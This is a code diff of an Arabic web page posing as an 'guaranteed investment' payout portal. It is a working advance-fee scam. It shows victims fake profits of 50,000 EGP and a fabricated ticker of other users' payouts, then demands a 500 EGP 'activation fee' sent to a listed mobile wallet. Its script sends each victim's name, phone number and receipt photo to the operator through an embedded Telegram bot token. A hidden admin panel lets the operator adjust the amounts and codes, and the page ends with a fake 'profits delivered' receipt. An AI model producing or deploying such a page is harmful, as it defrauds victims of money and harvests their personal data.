@@ -3,224 +3,208 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة التقوى | الصرف الرقمي</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <title>الاستثمار المضمون | بوابة الصرف الرقمي</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #0a0b1e; --gold: #ffd700; --green: #28a745; --glass: rgba(255, 255, 255, 0.1); }
-        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--primary); color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; user-select: none; }
+        :root { --blue: #0046af; --dark-blue: #002d72; --light-bg: #f4f7fe; --green: #28a745; --gold: #ffd700; }
+        body { margin: 0; font-family: 'Cairo', sans-serif; background: var(--light-bg); color: #333; overflow-x: hidden; }
         
-        .card { background: var(--glass); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.15); border-radius: 25px; width: 90%; max-width: 400px; padding: 30px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.5); position: relative; }
-        
-        input { width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 12px; border: 1px solid #444; background: rgba(0,0,0,0.3); color: white; text-align: center; font-size: 16px; outline: none; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; border-radius: 12px; border: none; background: var(--gold); color: #000; font-weight: 900; font-size: 18px; cursor: pointer; transition: 0.3s; }
-        
-        .profit-box { background: rgba(0,0,0,0.5); padding: 15px; border-radius: 15px; border-right: 4px solid var(--gold); margin: 15px 0; }
-        .wallet-display { background: #000; color: var(--gold); padding: 12px; border-radius: 10px; font-weight: bold; font-size: 19px; margin-bottom: 10px; border: 1px dashed var(--gold); }
+        nav { background: var(--blue); color: white; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .logo { font-weight: 900; font-size: 22px; letter-spacing: 1px; }
+        .nav-links { display: flex; gap: 15px; }
+        .nav-links span { cursor: pointer; font-size: 13px; font-weight: 600; opacity: 0.8; transition: 0.3s; padding: 5px 10px; border-radius: 5px; }
+        .nav-links span.active { opacity: 1; background: rgba(255,255,255,0.1); }
 
-        #admin-panel { position: fixed; inset: 0; background: #000; z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; overflow-y: auto; padding: 20px; }
-        .admin-content { background: #111; padding: 20px; border-radius: 20px; border: 1px solid var(--gold); width: 100%; max-width: 320px; }
-        
-        #verify-screen, #waiting-screen, #step-withdraw, #success-receipt { display: none; }
-        .loader-bar { width: 100%; height: 8px; background: #222; border-radius: 10px; overflow: hidden; margin-top: 20px; }
-        .loader-fill { width: 0%; height: 100%; background: var(--green); transition: 0.3s; }
-        
-        /* تصميم الإيصال النهائي */
-        .receipt-container { background: white; color: #333; border-radius: 20px; padding: 20px; border: 3px solid var(--green); position: relative; margin-top: 10px; }
-        .receipt-header { color: #000; font-weight: 900; font-size: 24px; margin-bottom: 5px; }
-        .receipt-check { background: var(--green); color: white; width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 10px; font-size: 20px; border: 3px solid white; position: absolute; top: -20px; left: 50%; transform: translateX(-50%); }
-        .receipt-row { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; font-size: 14px; }
-        .receipt-label { font-weight: bold; color: #666; }
-        .receipt-value { font-weight: bold; color: var(--green); text-align: left; }
-        .btn-download { background: var(--green); color: white; margin-top: 15px; font-size: 16px; }
-        .btn-back { background: #e9ecef; color: #333; margin-top: 8px; font-size: 14px; }
+        .live-bar { background: #fff9e6; color: #856404; padding: 8px 0; font-size: 12px; border-bottom: 1px solid #ffeeba; font-weight: bold; }
+        .container { max-width: 500px; margin: 20px auto; padding: 0 15px; padding-bottom: 100px; }
+        .page { display: none; animation: fadeIn 0.5s ease; }
+        .page.active { display: block; }
 
-        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 45px; height: 45px; cursor: pointer; z-index: 999; opacity: 0; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        .card { background: white; border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); margin-bottom: 20px; border-top: 6px solid var(--blue); }
+        h2 { color: var(--blue); margin-top: 0; font-size: 20px; text-align: center; margin-bottom: 20px; }
+
+        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 5px; color: #555; }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; font-family: 'Cairo'; box-sizing: border-box; background: #fdfdfd; }
+        
+        .btn-main { width: 100%; padding: 16px; border-radius: 12px; border: none; background: var(--blue); color: white; font-weight: 700; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn-main:hover { background: var(--dark-blue); }
+
+        .pay-table { width: 100%; border-collapse: collapse; background: white; border-radius: 10px; overflow: hidden; font-size: 14px; }
+        .pay-table th { background: #f8f9fa; padding: 12px; color: var(--blue); border-bottom: 2px solid #eee; }
+        .pay-table td { padding: 12px; text-align: center; border-bottom: 1px solid #eee; }
+        .status { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; }
+        .status.pending { background: #fff3cd; color: #856404; }
+
+        .verify-box { background: #f0f4ff; border: 2px dashed var(--blue); padding: 15px; border-radius: 15px; margin-top: 15px; display: none; }
+
+        .receipt { background: white; border: 3px solid var(--green); border-radius: 20px; padding: 25px; text-align: center; color: #333; }
+        .receipt-check { width: 60px; height: 60px; background: var(--green); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 30px; border: 4px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .receipt-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; font-size: 14px; }
+
+        .support-btn { position: fixed; bottom: 20px; left: 20px; background: #0088cc; color: white; padding: 12px 25px; border-radius: 50px; text-decoration: none; font-weight: bold; box-shadow: 0 5px 20px rgba(0,136,204,0.3); z-index: 2000; display: flex; align-items: center; gap: 8px; font-size: 14px; }
+        
+        #admin-trigger { position: fixed; bottom: 0; right: 0; width: 40px; height: 40px; cursor: pointer; z-index: 2000; opacity: 0; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-<div id="admin-trigger" onclick="runAdmin()"></div>
+<!-- شريط السحوبات المباشر -->
+<div class="live-bar">
+    <marquee scrollamount="5">🔔 تحديث: تم تحويل 14,200 ج.م للمستخدم (م*** علي) بنجاح .. تم تأكيد استلام 30,000 ج.م للمستخدم (سارة ع***) .. يرجى مراجعة الدعم لاستلام كود التفعيل الفوري.</marquee>
+</div>
 
-<!-- لوحة التحكم -->
-<div id="admin-panel">
-    <div class="admin-content">
-        <h3 style="color:var(--gold); text-align:center;">إعدادات الإدارة</h3>
-        <input type="text" id="setPass" placeholder="كود دخول الموقع">
-        <input type="number" id="setProfit" placeholder="مبلغ الربح">
-        <input type="number" id="setFees" placeholder="الرسوم">
-        <input type="text" id="setWallet" placeholder="رقم محفظتك">
-        <input type="text" id="setConfirmCode" placeholder="كود التفعيل">
-        <button onclick="saveConfig()">حفظ</button>
-        <button onclick="document.getElementById('admin-panel').style.display='none'" style="background:#333; color:white; margin-top:8px;">إغلاق</button>
+<nav>
+    <div class="logo">الاستثمار المضمون</div>
+    <div class="nav-links">
+        <span id="n-home" class="active" onclick="showPage('home')">الرئيسية</span>
+        <span id="n-payments" onclick="showPage('payments')">المدفوعات</span>
+        <span id="n-reports" onclick="showPage('reports')">التقارير</span>
     </div>
-</div>
+</nav>
 
-<!-- 1. الدخول -->
-<div class="card" id="step-login">
-    <h2 style="color:var(--gold)">بوابة التقوى</h2>
-    <input type="password" id="loginPass" placeholder="كود الوصول">
-    <button onclick="checkLogin()">دخول الحساب</button>
-</div>
+<div class="container">
 
-<!-- 2. السحب -->
-<div class="card" id="step-withdraw">
-    <div class="profit-box">
-        <span style="font-size:12px; color:#aaa;">أرباحك المتاحة</span>
-        <div style="font-size:28px; font-weight:900; color:var(--gold);"><span id="profitVal">50,000</span> <small>EGP</small></div>
+    <!-- الصفحة الرئيسية -->
+    <div id="home" class="page active">
+        <div class="card">
+            <h2>تأكيد بيانات الصرف</h2>
+            <p style="font-size: 13px; text-align: center; color: #666;">يجب تحويل رسوم التفعيل (<b id="f-fees">500</b> ج.م) للرقم التالي ورفع صورة الإيصال:</p>
+            <div style="background: #fdf2f2; color: #d9534f; padding: 15px; border-radius: 12px; text-align: center; font-size: 22px; font-weight: 900; margin-bottom: 20px; border: 1px solid #f5c6cb;" id="f-wallet">
+                01226811784
+            </div>
+            
+            <label>اسم المستلم الثلاثي:</label>
+            <input type="text" id="uName" placeholder="أدخل اسمك الكامل">
+            
+            <label>رقم محفظة الاستلام:</label>
+            <input type="tel" id="uPhone" placeholder="01xxxxxxxxx">
+            
+            <label>ارفق صورة الإيصال:</label>
+            <input type="file" id="uFile" accept="image/*" style="padding: 10px; width: 100%; border-radius: 10px; margin-bottom: 20px;">
+            
+            <button class="btn-main" onclick="submitRequest()">تقديم الطلب</button>
+        </div>
     </div>
-    <input type="text" id="uName" placeholder="الاسم الكامل">
-    <input type="tel" id="uWallet" placeholder="رقم المحفظة">
-    <p style="font-size:11px;">حول الرسوم (<span id="feesVal">500</span> ج.م) للرقم:</p>
-    <div class="wallet-display" id="walletVal">01226811784</div>
-    <input type="file" id="uFile" accept="image/*" style="background:#fff; color:#000; font-size:12px; padding: 5px;">
-    <button onclick="submitWithdraw()">تأكيد وطلب الكود</button>
-</div>
 
-<!-- 3. كود التفعيل -->
-<div class="card" id="verify-screen">
-    <h3 style="color:var(--gold)">تأكيد الهوية</h3>
-    <input type="text" id="confirmCodeInput" placeholder="أدخل كود التفعيل">
-    <button onclick="checkConfirmCode()" style="background:var(--green); color:white;">تفعيل وتحويل الآن</button>
-</div>
+    <!-- المدفوعات -->
+    <div id="payments" class="page">
+        <div class="card">
+            <h2>سجل العمليات</h2>
+            <table class="pay-table">
+                <thead>
+                    <tr><th>التاريخ</th><th>المبلغ</th><th>الحالة</th></tr>
+                </thead>
+                <tbody id="p-body">
+                    <tr><td colspan="3" style="color:#999; padding:20px;">لا توجد طلبات مسجلة</td></tr>
+                </tbody>
+            </table>
 
-<!-- 4. شاشة التحميل -->
-<div class="card" id="waiting-screen">
-    <h3 style="color:var(--green)">جاري التحويل...</h3>
-    <div class="loader-bar"><div class="loader-fill" id="fill"></div></div>
-    <p id="percent" style="margin-top:10px; font-weight:bold;">0%</p>
-</div>
-
-<!-- 5. الإيصال النهائي (شاشة النجاح) -->
-<div class="card" id="success-receipt" style="background: rgba(255,255,255,0.05);">
-    <h2 style="color:white; margin-bottom:20px;">تأكيد تسليم الأرباح</h2>
-    <div class="receipt-container">
-        <div class="receipt-check">✔</div>
-        <div class="receipt-header">تهانينا!</div>
-        <div style="margin-bottom:15px; font-weight:bold; color:#555;">تم تسليم الأرباح بنجاح</div>
-        
-        <div class="receipt-row">
-            <span class="receipt-label">المبلغ :</span>
-            <span class="receipt-value"><span id="rProfit">50000</span> جنيه مصري</span>
+            <div id="v-box" class="verify-box">
+                <h4 style="margin:0 0 10px 0; color:var(--blue);">🔒 مطلوب كود تفعيل</h4>
+                <p style="font-size: 12px;">طلبك جاهز للصرف، أدخل كود التفعيل المستلم من الدعم الفني:</p>
+                <input type="text" id="activeCode" placeholder="أدخل الكود">
+                <button class="btn-main" style="padding:10px; background:var(--green);" onclick="verifyCode()">تفعيل وتحويل</button>
+            </div>
         </div>
-        <div class="receipt-row">
-            <span class="receipt-label">اسم المستلم :</span>
-            <span class="receipt-value" id="rName">الاسم</span>
-        </div>
-        <div class="receipt-row">
-            <span class="receipt-label">تاريخ العملية :</span>
-            <span class="receipt-value" id="rDate">2 مايو 2026</span>
-        </div>
-        <div class="receipt-row" style="border:none;">
-            <span class="receipt-label">رقم المرجع :</span>
-            <span class="receipt-value" style="color:#333;" id="rRef">#A73928475621</span>
-        </div>
-        
-        <button class="btn-download" onclick="window.print()">تحميل الإيصال</button>
-        <button class="btn-back" onclick="location.reload()">العودة للوحة التحكم</button>
     </div>
+
+    <!-- التقارير -->
+    <div id="reports" class="page">
+        <div class="card">
+            <h2>التقرير المالي</h2>
+            <div style="background:#f8f9fa; padding:15px; border-radius:10px;">
+                <p>إجمالي الأرباح: <b style="color:var(--blue);" id="r-profit">50,000 ج.م</b></p>
+                <p>الحالة: <b style="color:#856404;">بانتظار تفعيل الرسوم</b></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- الإيصال النهائي -->
+    <div id="final" class="page">
+        <div class="receipt">
+            <div class="receipt-check">✔</div>
+            <h2>تهانينا!</h2>
+            <p>تم تسليم الأرباح بنجاح</p>
+            <div class="receipt-row"><b>المبلغ:</b> <span id="res-profit">50000</span> ج.م</div>
+            <div class="receipt-row"><b>المستلم:</b> <span id="res-name">---</span></div>
+            <div class="receipt-row" style="border:none;"><b>المرجع:</b> <span id="res-ref">#A88273</span></div>
+            <button class="btn-main" style="margin-top:20px;" onclick="location.reload()">إغلاق</button>
+        </div>
+    </div>
+
 </div>
+
+<!-- الإدارة -->
+<div id="admin-trigger" onclick="openAdmin()"></div>
+<div id="admin-panel" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:5000; color:white; padding:20px; text-align:center;">
+    <h3>لوحة المدير</h3>
+    <input type="number" id="s-profit" placeholder="المبلغ">
+    <input type="number" id="s-fees" placeholder="الرسوم">
+    <input type="text" id="s-wallet" placeholder="المحفظة">
+    <input type="text" id="s-code" placeholder="كود التفعيل">
+    <button onclick="saveAdmin()" style="background:var(--green); border:none; padding:15px; width:100%; color:white; font-weight:bold;">حفظ التعديلات</button>
+</div>
+
+<!-- زر التلجرام الخاص بك -->
+<a href="https://t.me/Hazem_ahmedd" target="_blank" class="support-btn">
+    <svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.11.02-1.93 1.23-5.46 3.62-.51.35-.98.52-1.4.51-.46-.01-1.35-.26-2.01-.48-.81-.27-1.46-.42-1.4-.88.03-.24.38-.49 1.04-.74 4.06-1.77 6.76-2.93 8.11-3.48 3.84-1.58 4.63-1.85 5.16-1.86.11 0 .37.03.54.17.14.12.18.28.19.4z"/></svg>
+    <span>تواصل مع الدعم الفني</span>
+</a>
 
 <script>
     const TOKEN = '8412077444:AAHgu7XnlUMAaRPayFmUtD14AAbTznPJRII';
     const CHAT_ID = '8292390266';
 
-    let config = JSON.parse(localStorage.getItem('at_v9')) || {
-        pass: '123456', profit: 50000, fees: 500, wallet: '01226811784', confirmCode: '7788'
-    };
+    let config = { profit: 50000, fees: 500, wallet: '01226811784', code: '9900' };
 
-    function loadData() {
-        document.getElementById('profitVal').innerText = Number(config.profit).toLocaleString();
-        document.getElementById('feesVal').innerText = config.fees;
-        document.getElementById('walletVal').innerText = config.wallet;
-        document.getElementById('setPass').value = config.pass;
-        document.getElementById('setProfit').value = config.profit;
-        document.getElementById('setFees').value = config.fees;
-        document.getElementById('setWallet').value = config.wallet;
-        document.getElementById('setConfirmCode').value = config.confirmCode;
-    }
-    loadData();
-
-    function checkLogin() {
-        if(document.getElementById('loginPass').value === config.pass) {
-            document.getElementById('step-login').style.display = 'none';
-            document.getElementById('step-withdraw').style.display = 'block';
-        } else { alert("الكود غير صحيح"); }
+    function showPage(id) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.querySelectorAll('.nav-links span').forEach(s => s.classList.remove('active'));
+        if(id !== 'final') document.getElementById('n-'+id)?.classList.add('active');
     }
 
-    async function submitWithdraw() {
+    async function submitRequest() {
         const name = document.getElementById('uName').value;
+        const phone = document.getElementById('uPhone').value;
         const file = document.getElementById('uFile').files[0];
-        if(!name || !file) return alert("أكمل البيانات");
+        if(!name || !phone || !file) return alert("أكمل البيانات");
+
+        document.getElementById('p-body').innerHTML = `<tr><td>2026-05-02</td><td>${config.profit} ج.م</td><td><span class="status pending">انتظار التفعيل</span></td></tr>`;
 
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
         fd.append('photo', file);
-        fd.append('caption', `🔔 طلب جديد\n👤 العميل: ${name}\n💰 الربح: ${config.profit}\n🔑 الكود: ${config.confirmCode}`);
+        fd.append('caption', `🔔 إشعار جديد\n👤 الاسم: ${name}\n📱 الرقم: ${phone}\n💰 المبلغ: ${config.profit}\n🔑 كود تفعيله: ${config.code}`);
 
+        alert("تم استلام الطلب بنجاح!");
+        showPage('payments');
+        document.getElementById('v-box').style.display = 'block';
         fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        
-        document.getElementById('step-withdraw').style.display = 'none';
-        document.getElementById('verify-screen').style.display = 'block';
     }
 
-    function checkConfirmCode() {
-        if(document.getElementById('confirmCodeInput').value === config.confirmCode) {
-            document.getElementById('verify-screen').style.display = 'none';
-            document.getElementById('waiting-screen').style.display = 'block';
-            startLoading();
-        } else { alert("كود التفعيل غلط!"); }
+    function verifyCode() {
+        if(document.getElementById('activeCode').value === config.code) {
+            document.getElementById('res-profit').innerText = config.profit;
+            document.getElementById('res-name').innerText = document.getElementById('uName').value;
+            document.getElementById('res-ref').innerText = "#A" + Math.floor(Math.random()*900000);
+            showPage('final');
+        } else { alert("كود التفعيل غير صحيح"); }
     }
 
-    function startLoading() {
-        let p = 0;
-        let fill = document.getElementById('fill');
-        let txt = document.getElementById('percent');
-        let interval = setInterval(() => {
-            p += Math.floor(Math.random() * 3) + 1;
-            if(p > 100) p = 100;
-            fill.style.width = p + "%";
-            txt.innerText = p + "%";
-            if(p >= 100) {
-                clearInterval(interval);
-                showReceipt();
-            }
-        }, 500);
+    function openAdmin() {
+        if(prompt("كلمة السر:") === "1122") document.getElementById('admin-panel').style.display = 'block';
     }
 
-    function showReceipt() {
-        document.getElementById('waiting-screen').style.display = 'none';
-        document.getElementById('success-receipt').style.display = 'block';
-        
-        // تعبئة بيانات الإيصال
-        document.getElementById('rProfit').innerText = Number(config.profit).toLocaleString();
-        document.getElementById('rName').innerText = document.getElementById('uName').value;
-        
-        // تاريخ اليوم
-        const d = new Date();
-        const dateStr = d.getDate() + " مايو " + d.getFullYear();
-        document.getElementById('rDate').innerText = dateStr;
-        
-        // رقم مرجعي عشوائي
-        document.getElementById('rRef').innerText = "#A" + Math.floor(Math.random() * 9000000000 + 1000000000);
-    }
-
-    let clicks = 0;
-    function runAdmin() {
-        clicks++; if(clicks >= 5) { document.getElementById('admin-panel').style.display='flex'; clicks=0; }
-    }
-
-    function saveConfig() {
-        config = {
-            pass: document.getElementById('setPass').value,
-            profit: document.getElementById('setProfit').value,
-            fees: document.getElementById('setFees').value,
-            wallet: document.getElementById('setWallet').value,
-            confirmCode: document.getElementById('setConfirmCode').value
-        };
-        localStorage.setItem('at_v9', JSON.stringify(config));
-        loadData();
-        document.getElementById('admin-panel').style.display='none';
-        alert("تم الحفظ!");
+    function saveAdmin() {
+        config.profit = document.getElementById('s-profit').value || config.profit;
+        config.fees = document.getElementById('s-fees').value || config.fees;
+        config.wallet = document.getElementById('s-wallet').value || config.wallet;
+        config.code = document.getElementById('s-code').value || config.code;
+        alert("تم الحفظ");
+        location.reload();
     }
 </script>
 </body>
